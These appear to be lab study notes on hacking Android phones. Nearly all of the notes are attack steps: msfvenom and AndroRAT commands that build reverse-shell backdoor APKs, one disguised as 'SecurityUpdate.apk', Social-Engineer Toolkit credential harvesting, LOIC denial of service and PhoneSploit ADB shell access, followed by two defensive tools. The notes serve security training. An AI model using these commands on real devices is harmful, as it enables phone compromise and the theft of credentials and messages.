# Hacking Mobile Platform

## Hack android devices

- Hack an Android device by creating binary payloads using Parrot Security  
`msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R >Desktop/Backdoor.apk`

- Harvest users’ credentials using the Social-Engineer Toolkit  
setoolkit  
1 - Social-Engineering Attacks  
2 - Website Attack Vectors  
3 - Credential Harvester Attack Method  
2 - Site cloner  

- Launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform  
    android app

- Exploit the Android platform through ADB using PhoneSploit  
`python3 phonesploit.py`  
3 - connect a new phone  
4 - access shell on a phone  
7 - screen shot a picture on a phone  

- Hack an Android device by creating APK file using AndroRAT  
`python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk`  
`python3 androRAT.py --shell -i 0.0.0.0 -p 4444`  

help
getSMS  
getMACAddress  

## Secure Android Devices using Various Android Security Tools

- Analyze a malicious app using online Android analyzers  
<https://www.sisik.eu/apk-tool>

- Secure Android devices from malicious apps using Malwarebytes Security  
andorid app
